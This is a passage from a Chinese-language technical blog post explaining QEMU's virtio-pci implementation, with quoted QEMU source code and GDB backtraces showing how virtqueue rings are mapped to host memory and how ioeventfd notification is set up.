class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_pci_common_write (opaque=0x5555580bdd70, addr=22, val=0, size=2) at ../../qemu/hw/virtio/virtio-pci.c:1689</span></span><br><span class="line"><span class="comment">//#1  0x0000555555e1e25a in memory_region_write_accessor (mr=0x5555580be8b0, addr=22, value=0x7ffff5bff5d8, size=2, shift=0, mask=65535, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#2  0x0000555555e1e593 in access_with_adjusted_size (addr=22, value=0x7ffff5bff5d8, size=2, access_size_min=1, access_size_max=4, access_fn=0x555555e1e160 &lt;memory_region_write_accessor&gt;, mr=0x5555580be8b0, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#3  0x0000555555e218ad in memory_region_dispatch_write (mr=0x5555580be8b0, addr=22, data=0, op=MO_16, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e2fffa in flatview_write_continue_step (attrs=..., buf=0x7ffff7f86028 &quot;&quot;, len=2, mr_addr=22, l=0x7ffff5bff6c0, mr=0x5555580be8b0) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e300ca in flatview_write_continue (fv=0x7ffee0703240, addr=481036337174, attrs=..., ptr=0x7ffff7f86028, len=2, mr_addr=22, l=2, mr=0x5555580be8b0) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e301dc in flatview_write (fv=0x7ffee0703240, addr=481036337174, attrs=..., buf=0x7ffff7f86028, len=2) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e3062a in address_space_write (as=0x555557055ee0 &lt;address_space_memory&gt;, addr=481036337174, attrs=..., buf=0x7ffff7f86028, len=2) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e306a6 in address_space_rw (as=0x555557055ee0 &lt;address_space_memory&gt;, addr=481036337174, attrs=..., buf=0x7ffff7f86028, len=2, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e8a690 in kvm_cpu_exec (cpu=0x5555573ef900) at ../../qemu/accel/kvm/kvm-all.c:2912</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e8d712 in kvm_vcpu_thread_fn (arg=0x5555573ef900) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#11 0x00005555560b6f08 in qemu_thread_start (args=0x5555573f8ad0) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#12 0x00007ffff7694ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#13 0x00007ffff7726850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_common_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr,</span></span><br><span class="line"><span class="params">                                    <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtIOPCIProxy *proxy = opaque;</span><br><span class="line">    VirtIODevice *vdev = virtio_bus_get_device(&amp;proxy-&gt;bus);</span><br><span class="line">    <span class="type">uint16_t</span> <span class="built_in">vector</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vdev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_DFSELECT:</span><br><span class="line">        proxy-&gt;dfselect = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_GFSELECT:</span><br><span class="line">        proxy-&gt;gfselect = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_GF:</span><br><span class="line">        <span class="keyword">if</span> (proxy-&gt;gfselect &lt; ARRAY_SIZE(proxy-&gt;guest_features)) &#123;</span><br><span class="line">            proxy-&gt;guest_features[proxy-&gt;gfselect] = val;</span><br><span class="line">            virtio_set_features(vdev,</span><br><span class="line">                                (((<span class="type">uint64_t</span>)proxy-&gt;guest_features[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">                                proxy-&gt;guest_features[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_MSIX:</span><br><span class="line">        <span class="keyword">if</span> (vdev-&gt;config_vector != VIRTIO_NO_VECTOR) &#123;</span><br><span class="line">            msix_vector_unuse(&amp;proxy-&gt;pci_dev, vdev-&gt;config_vector);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Make it possible for guest to discover an error took place. */</span></span><br><span class="line">        <span class="keyword">if</span> (val &lt; proxy-&gt;nvectors) &#123;</span><br><span class="line">            msix_vector_use(&amp;proxy-&gt;pci_dev, val);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            val = VIRTIO_NO_VECTOR;</span><br><span class="line">        &#125;</span><br><span class="line">        vdev-&gt;config_vector = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_STATUS:</span><br><span class="line">        <span class="keyword">if</span> (!(val &amp; VIRTIO_CONFIG_S_DRIVER_OK)) &#123;</span><br><span class="line">            virtio_pci_stop_ioeventfd(proxy);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        virtio_set_status(vdev, val &amp; <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (val &amp; VIRTIO_CONFIG_S_DRIVER_OK) &#123;</span><br><span class="line">            virtio_pci_start_ioeventfd(proxy);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (vdev-&gt;status == <span class="number">0</span>) &#123;</span><br><span class="line">            virtio_pci_reset(DEVICE(proxy));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_SELECT:</span><br><span class="line">        <span class="keyword">if</span> (val &lt; VIRTIO_QUEUE_MAX) &#123;</span><br><span class="line">            vdev-&gt;queue_sel = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_SIZE:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].num = val;</span><br><span class="line">        virtio_queue_set_num(vdev, vdev-&gt;queue_sel,</span><br><span class="line">                             proxy-&gt;vqs[vdev-&gt;queue_sel].num);</span><br><span class="line">        virtio_init_region_cache(vdev, vdev-&gt;queue_sel);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_MSIX:</span><br><span class="line">        <span class="built_in">vector</span> = virtio_queue_vector(vdev, vdev-&gt;queue_sel);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">vector</span> != VIRTIO_NO_VECTOR) &#123;</span><br><span class="line">            msix_vector_unuse(&amp;proxy-&gt;pci_dev, <span class="built_in">vector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Make it possible for guest to discover an error took place. */</span></span><br><span class="line">        <span class="keyword">if</span> (val &lt; proxy-&gt;nvectors) &#123;</span><br><span class="line">            msix_vector_use(&amp;proxy-&gt;pci_dev, val);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            val = VIRTIO_NO_VECTOR;</span><br><span class="line">        &#125;</span><br><span class="line">        virtio_queue_set_vector(vdev, vdev-&gt;queue_sel, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_ENABLE:</span><br><span class="line">        <span class="keyword">if</span> (val == <span class="number">1</span>) &#123;</span><br><span class="line">            virtio_queue_set_num(vdev, vdev-&gt;queue_sel,</span><br><span class="line">                                 proxy-&gt;vqs[vdev-&gt;queue_sel].num);</span><br><span class="line">            virtio_queue_set_rings(vdev, vdev-&gt;queue_sel,</span><br><span class="line">                       ((<span class="type">uint64_t</span>)proxy-&gt;vqs[vdev-&gt;queue_sel].desc[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span> |</span><br><span class="line">                       proxy-&gt;vqs[vdev-&gt;queue_sel].desc[<span class="number">0</span>],</span><br><span class="line">                       ((<span class="type">uint64_t</span>)proxy-&gt;vqs[vdev-&gt;queue_sel].avail[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span> |</span><br><span class="line">                       proxy-&gt;vqs[vdev-&gt;queue_sel].avail[<span class="number">0</span>],</span><br><span class="line">                       ((<span class="type">uint64_t</span>)proxy-&gt;vqs[vdev-&gt;queue_sel].used[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span> |</span><br><span class="line">                       proxy-&gt;vqs[vdev-&gt;queue_sel].used[<span class="number">0</span>]);</span><br><span class="line">            proxy-&gt;vqs[vdev-&gt;queue_sel].enabled = <span class="number">1</span>;</span><br><span class="line">            proxy-&gt;vqs[vdev-&gt;queue_sel].reset = <span class="number">0</span>;</span><br><span class="line">            virtio_queue_enable(vdev, vdev-&gt;queue_sel);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            virtio_error(vdev, <span class="string">&quot;wrong value for queue_enable %&quot;</span>PRIx64, val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_DESCLO:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].desc[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_DESCHI:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].desc[<span class="number">1</span>] = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_AVAILLO:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].avail[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_AVAILHI:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].avail[<span class="number">1</span>] = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_USEDLO:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].used[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_USEDHI:</span><br><span class="line">        proxy-&gt;vqs[vdev-&gt;queue_sel].used[<span class="number">1</span>] = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> VIRTIO_PCI_COMMON_Q_RESET:</span><br><span class="line">        <span class="keyword">if</span> (val == <span class="number">1</span>) &#123;</span><br><span class="line">            proxy-&gt;vqs[vdev-&gt;queue_sel].reset = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            virtio_queue_reset(vdev, vdev-&gt;queue_sel);</span><br><span class="line"></span><br><span class="line">            proxy-&gt;vqs[vdev-&gt;queue_sel].reset = <span class="number">0</span>;</span><br><span class="line">            proxy-&gt;vqs[vdev-&gt;queue_sel].enabled = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>实际上数据处理包括数据传输和通知两部分，数据传输是通过内存共享实现的，而通知是通过内核的<a href="https://juejin.cn/post/6989608237226000391">eventfd机制</a>实现的</p><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>由于<strong>guest</strong>物理地址空间位于qemu的进程地址空间中，因此qemu天然就可以访问<strong>guest</strong>的任意物理地址。<br>因此，只要知道<strong>guest</strong>中为<strong>virtqueue</strong>分配的物理地址空间，<strong>virtio设备</strong>即可找到这些空间在<strong>qemu</strong>进程空间中的<strong>hva</strong>，即可完成访问，这是在<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio.c#L2178"><strong>virtio_queue_set_rings()</strong></a>中完成的</p><p>具体的，根据前面<a href="#virtio组件">virtio组件</a>小节可知，当<strong>guest</strong>设置<strong>VIRTIO_PCI_COMMON_Q_ENABLE</strong>字段来完成virtqueue的设置时，qemu会调用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio.c#L2178"><strong>virtio_queue_set_rings()</strong></a>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">virtio_queue_set_rings</span><span class="params">(VirtIODevice *vdev, <span class="type">int</span> n, hwaddr desc,</span></span><br><span class="line"><span class="params">                            hwaddr avail, hwaddr used)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!vdev-&gt;vq[n].vring.num) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vdev-&gt;vq[n].vring.desc = desc;</span><br><span class="line">    vdev-&gt;vq[n].vring.avail = avail;</span><br><span class="line">    vdev-&gt;vq[n].vring.used = used;</span><br><span class="line">    virtio_init_region_cache(vdev, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">virtio_init_region_cache</span><span class="params">(VirtIODevice *vdev, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    VirtQueue *vq = &amp;vdev-&gt;vq[n];</span><br><span class="line">    VRingMemoryRegionCaches *old = vq-&gt;vring.caches;</span><br><span class="line">    VRingMemoryRegionCaches *new = <span class="literal">NULL</span>;</span><br><span class="line">    hwaddr addr, size;</span><br><span class="line">    <span class="type">int64_t</span> len;</span><br><span class="line">    <span class="type">bool</span> packed;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    new = g_new0(VRingMemoryRegionCaches, <span class="number">1</span>);</span><br><span class="line">    size = virtio_queue_get_desc_size(vdev, n);</span><br><span class="line">    packed = virtio_vdev_has_feature(vq-&gt;vdev, VIRTIO_F_RING_PACKED) ?</span><br><span class="line">                                   <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    len = address_space_cache_init(&amp;new-&gt;desc, vdev-&gt;dma_as,</span><br><span class="line">                                   addr, size, packed);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; size) &#123;</span><br><span class="line">        virtio_error(vdev, <span class="string">&quot;Cannot map desc&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size = virtio_queue_get_used_size(vdev, n);</span><br><span class="line">    len = address_space_cache_init(&amp;new-&gt;used, vdev-&gt;dma_as,</span><br><span class="line">                                   vq-&gt;vring.used, size, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; size) &#123;</span><br><span class="line">        virtio_error(vdev, <span class="string">&quot;Cannot map used&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_used;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    size = virtio_queue_get_avail_size(vdev, n);</span><br><span class="line">    len = address_space_cache_init(&amp;new-&gt;avail, vdev-&gt;dma_as,</span><br><span class="line">                                   vq-&gt;vring.avail, size, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; size) &#123;</span><br><span class="line">        virtio_error(vdev, <span class="string">&quot;Cannot map avail&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_avail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qatomic_rcu_set(&amp;vq-&gt;vring.caches, new);</span><br><span class="line">    <span class="keyword">if</span> (old) &#123;</span><br><span class="line">        call_rcu(old, virtio_free_region_cache, rcu);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int64_t</span> <span class="title function_">address_space_cache_init</span><span class="params">(MemoryRegionCache *cache,</span></span><br><span class="line"><span class="params">                                 AddressSpace *as,</span></span><br><span class="line"><span class="params">                                 hwaddr addr,</span></span><br><span class="line"><span class="params">                                 hwaddr len,</span></span><br><span class="line"><span class="params">                                 <span class="type">bool</span> is_write)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddressSpaceDispatch *d;</span><br><span class="line">    hwaddr l;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    Int128 diff;</span><br><span class="line"></span><br><span class="line">    assert(len &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    l = len;</span><br><span class="line">    cache-&gt;fv = address_space_get_flatview(as);</span><br><span class="line">    d = flatview_to_dispatch(cache-&gt;fv);</span><br><span class="line">    cache-&gt;mrs = *address_space_translate_internal(d, addr, &amp;cache-&gt;xlat, &amp;l, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * cache-&gt;xlat is now relative to cache-&gt;mrs.mr, not to the section itself.</span></span><br><span class="line"><span class="comment">     * Take that into account to compute how many bytes are there between</span></span><br><span class="line"><span class="comment">     * cache-&gt;xlat and the end of the section.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    diff = int128_sub(cache-&gt;mrs.size,</span><br><span class="line">                      int128_make64(cache-&gt;xlat - cache-&gt;mrs.offset_within_region));</span><br><span class="line">    l = int128_get64(int128_min(diff, int128_make64(l)));</span><br><span class="line"></span><br><span class="line">    mr = cache-&gt;mrs.mr;</span><br><span class="line">    memory_region_ref(mr);</span><br><span class="line">    <span class="keyword">if</span> (memory_access_is_direct(mr, is_write)) &#123;</span><br><span class="line">        <span class="comment">/* We don&#x27;t care about the memory attributes here as we&#x27;re only</span></span><br><span class="line"><span class="comment">         * doing this if we found actual RAM, which behaves the same</span></span><br><span class="line"><span class="comment">         * regardless of attributes; so UNSPECIFIED is fine.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        l = flatview_extend_translation(cache-&gt;fv, addr, len, mr,</span><br><span class="line">                                        cache-&gt;xlat, l, is_write,</span><br><span class="line">                                        MEMTXATTRS_UNSPECIFIED);</span><br><span class="line">        cache-&gt;ptr = qemu_ram_ptr_length(mr-&gt;ram_block, cache-&gt;xlat, &amp;l, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cache-&gt;ptr = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cache-&gt;len = l;</span><br><span class="line">    cache-&gt;is_write = is_write;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据<a href="/2024/07/20/qemu%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/" title="qemu内存模型">qemu内存模型</a>可知，这里直接将<strong>virtqueue</strong>对应的<strong>gpa</strong>转换为qemu中的<strong>hva</strong>存储在<strong>VRingMemoryRegionCaches</strong>结构中。因此<strong>virito设备</strong>可通过该结构直接访问<strong>virtiqueue</strong>中的数据，而<strong>guest</strong>通过<strong>gpa</strong>直接访问<strong>virtqueue</strong>中的数据，从而实现数据传输</p><h3 id="数据通知"><a href="#数据通知" class="headerlink" title="数据通知"></a>数据通知</h3><p>通知包括两部分——<strong>guest</strong>通知<strong>virtio设备</strong>(ioeventfd)、<strong>virtio设备</strong>中断<strong>guest</strong>(ioctl)。</p><p>其中前半部分是由内核的<strong>eventfd</strong>机制实现</p><blockquote><p>eventfd() creates an “eventfd object” that can be used as an<br>event wait/notify mechanism by user-space applications, and by<br>the kernel to notify user-space applications of events.</p></blockquote><p>而后半部分则是由硬件提供的机制实现的，即cpu提供了向<strong>guest</strong>注入中断的接口，则<strong>virtio设备</strong>通过ioctl调用该接口即可</p><h4 id="通知设备"><a href="#通知设备" class="headerlink" title="通知设备"></a>通知设备</h4><p>ioeventfd机制的示意图如下图所示<br><img src="ioeventfd示意图.png" alt="ioeventfd示意图"></p><p>根据前面<a href="#virtio组件">virtio组件</a>小节可知，当<strong>guest</strong>设置<strong>VIRTIO_PCI_COMMON_STATUS</strong>字段来完成virtio设备的设置时，qemu会调用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L373"><strong>virtio_pci_start_ioeventfd()</strong></a>设置<strong>eventfd</strong>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  virtio_bus_start_ioeventfd (bus=0x5555580b8df0) at ../../qemu/hw/virtio/virtio-bus.c:220</span></span><br><span class="line"><span class="comment">//#1  0x0000555555b6f952 in virtio_pci_start_ioeventfd (proxy=0x5555580b0900) at ../../qemu/hw/virtio/virtio-pci.c:375</span></span><br><span class="line"><span class="comment">//#2  0x0000555555b72cae in virtio_pci_common_write (opaque=0x5555580b0900, addr=20, val=15, size=1) at ../../qemu/hw/virtio/virtio-pci.c:1732</span></span><br><span class="line"><span class="comment">//#3  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555580b1440, addr=20, value=0x7ffff65ff5d8, size=1, shift=0, mask=255, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#4  0x0000555555e19d39 in access_with_adjusted_size (addr=20, value=0x7ffff65ff5d8, size=1, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555580b1440, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555580b1440, addr=20, data=15, op=MO_8, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f89028 &quot;\017&quot;, len=1, mr_addr=20, l=0x7ffff65ff6c0, mr=0x5555580b1440) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee8000c10, addr=30786325577748, attrs=..., ptr=0x7ffff7f89028, len=1, mr_addr=20, l=1, mr=0x5555580b1440) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2b982 in flatview_write (fv=0x7ffee8000c10, addr=30786325577748, attrs=..., buf=0x7ffff7f89028, len=1) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e2bdd0 in address_space_write (as=0x55555704dce0 &lt;address_space_memory&gt;, addr=30786325577748, attrs=..., buf=0x7ffff7f89028, len=1) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e2be4c in address_space_rw (as=0x55555704dce0 &lt;address_space_memory&gt;, addr=30786325577748, attrs=..., buf=0x7ffff7f89028, len=1, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e85e36 in kvm_cpu_exec (cpu=0x5555573b4110) at ../../qemu/accel/kvm/kvm-all.c:2912</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573b4110) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#13 0x00005555560b2687 in qemu_thread_start (args=0x5555573bd220) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#14 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#15 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_pci_start_ioeventfd</span><span class="params">(VirtIOPCIProxy *proxy)</span></span><br><span class="line">&#123;</span><br><span class="line">    virtio_bus_start_ioeventfd(&amp;proxy-&gt;bus);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">virtio_bus_start_ioeventfd</span><span 